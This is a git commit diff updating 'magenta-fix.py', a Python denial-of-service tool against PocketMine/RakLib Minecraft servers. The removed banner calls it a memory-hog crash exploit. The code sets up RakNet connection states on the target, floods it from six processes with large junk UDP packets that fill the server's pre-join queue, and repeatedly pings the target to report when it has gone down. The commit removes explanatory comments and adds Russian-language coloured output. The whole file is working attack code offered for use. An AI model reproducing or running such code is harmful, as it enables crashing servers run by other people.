936e0c8ef234347383a6f5324dcb69ee2836bcae
DevClancy <70335809+DevClancy@users.noreply.github.com>
2021-06-20 04:21:36 +0300

    Update magenta-fix.py

--- magenta-fix.py
+++ magenta-fix.py
@@ -3,72 +3,76 @@ from struct import pack
 from time import sleep, time
 from multiprocessing import Process, current_process
 from datetime import datetime
+import os
+from colorama import init
+from colorama import Fore
+
+init()
 
 BANNER = '''
-Magenta v0.1 - PocketMine-Raklib memory-hog (crash) exploit
+Magenta 0.1 - FIX by Devclancy
 '''
 
 
-def address(addr, port): # Simple python implementation of raklib\protocol\Packet::putAddress()
+def address(addr, port):
     return "\x04" + ''.join([chr(int(i)) for i in addr.split('.')]) + chr(int(port / 256)) + chr(port % 256)
 
-def junk(addr, port, initsleep = 0): # Main exploit code
-    signal.signal(signal.SIGINT, lambda a, b: sys.exit(0)) # Forget it :) just for handling KeyboardInterrupt
-    MAGIC = "\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78" # raklib\RakLib::MAGIC. Maybe raknet thing?
-    PROTOCOL = 6 # raklib\RakLib::PROTOCOL. Raklib doesn't seem to check protocol version on OPEN_CONNECTION_XX packets.
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP socket
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*64) # Tried to increase buffer, but failed. IDK why.
-    OPEN_CONNECTION_REQUEST_1 = chr(5) + MAGIC + chr(PROTOCOL) + "\x00" # Yap. simple. 0x05(Header) + MAGIC + protocol version
-    OPEN_CONNECTION_REQUEST_2 = chr(7) + MAGIC + address(addr, port) + "\x00" + chr(19) + "\x6d\x6e\x74\x61" # 0x07(Header) + MAGIC + server address/port + mtu size(idk. just set to 19) + clientID
-    TRUCK = bytes(b'\x00\xff\x00' + b'\x8c' + ((b'\x00') * (1464))) #max size: 1464. size >= 1465 will cause packet drops. IDK why.
+def junk(addr, port, initsleep = 0):
+    signal.signal(signal.SIGINT, lambda a, b: sys.exit(0))
+    MAGIC = "\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
+    PROTOCOL = 6
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*64)
+    OPEN_CONNECTION_REQUEST_1 = chr(5) + MAGIC + chr(PROTOCOL) + "\x00"
+    OPEN_CONNECTION_REQUEST_2 = chr(7) + MAGIC + address(addr, port) + "\x00" + chr(19) + "\x6d\x6e\x74\x61"
+    TRUCK = bytes(b'\x00\xff\x00' + b'\x8c' + ((b'\x00') * (1464)))
     sleep(initsleep)
-    sock.sendto(bytes(OPEN_CONNECTION_REQUEST_1, 'utf-8'), (addr, port)) #Session state set to STATE_CONNECTING_1
-    sock.sendto(bytes(OPEN_CONNECTION_REQUEST_2, 'utf-8'), (addr, port)) #Session state set to STATE_CONNECTING_2, preJoinQueue is available now
+    sock.sendto(bytes(OPEN_CONNECTION_REQUEST_1, 'utf-8'), (addr, port))
+    sock.sendto(bytes(OPEN_CONNECTION_REQUEST_2, 'utf-8'), (addr, port))
     seq = 1
     while True:
-        sock.sendto(bytes(b'\x8c') + pack('<L', seq)[:3] + TRUCK, (addr, port)) #Junk packets! These will be stored in preJoinQueue, until the session is closed.
+        sock.sendto(bytes(b'\x8c') + pack('<L', seq)[:3] + TRUCK, (addr, port))
         seq += 1
-        sleep(0.005) #To prevent IP block from server
+        sleep(0.005)
 
 def killall(processes):
-    sys.stdout.write("[%s] Interrupting all processes: exit" % datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S'))
-    for process in processes:
-        process.join()
-        process.terminate()
-    sys.exit(0)
+    exit()
 
 def check(addr, port, processes):
     signal.signal(signal.SIGINT, lambda a, b: killall(processes))
     while True:
-        sys.stdout.write("[%s] Checking server availibility... " % datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S'))
+        sys.stdout.write(Fore.CYAN + "[%s] Проверяю сервер... " % datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S'))
         asock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         asock.settimeout(10)
         asock.sendto(bytes("\x01\xaa\xba\xba\xaa\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78", 'utf-8'), (addr, port)) # unconnected ping, to check server availibility.
         try:
             resp = binascii.hexlify(asock.recv(1024))
         except (socket.timeout, ConnectionError):
-            sys.stdout.write('Server seems UNREACHABLE. Maybe dead?\n')
+            sys.stdout.write(Fore.GREEN + "Сервер не отвечает. Может быть он умер?\n")
             killall(processes)
             continue
 
         if resp.decode('utf-8')[:4] == '1cc2':
-            sys.stdout.write('Server is still alive.\n')
+            sys.stdout.write(Fore.RED + "Сервер живой.\n")
         else:
-            sys.stdout.write('Server seems DEAD, or blocked you!\n')
+            sys.stdout.write(Fore.GREEN + "Сервер умер, либо заблокировал тебя.\n")
             killall(processes)
 
-        sleep(15) # check every 15 secs
+        sleep(15)
 
 if __name__ == '__main__':
-    print(BANNER)
+    os.system("cls")
+
+    print(Fore.RED + BANNER)
+
     if len(sys.argv) < 3:
-        print('Usage: %s <address> <port>' % (sys.argv[0]))
+        print(Fore.CYAN + 'Используй: %s <address> <port>' % (sys.argv[0]))
         sys.exit()
 
     addr = socket.gethostbyname(sys.argv[1])
-    print("Address: %s (%s)" % (sys.argv[1], addr))
+    print(Fore.CYAN + "Address: %s (%s)" % (sys.argv[1], addr))
     sleep(0.5)
-    processes = [Process(target=junk, args=(addr, int(sys.argv[2]), i * (0.01/16))) for i in range(6)] # Multiprocessing! yay!
+    processes = [Process(target=junk, args=(addr, int(sys.argv[2]), i * (0.01/16))) for i in range(6)]
     for p in processes:
         p.start()
 
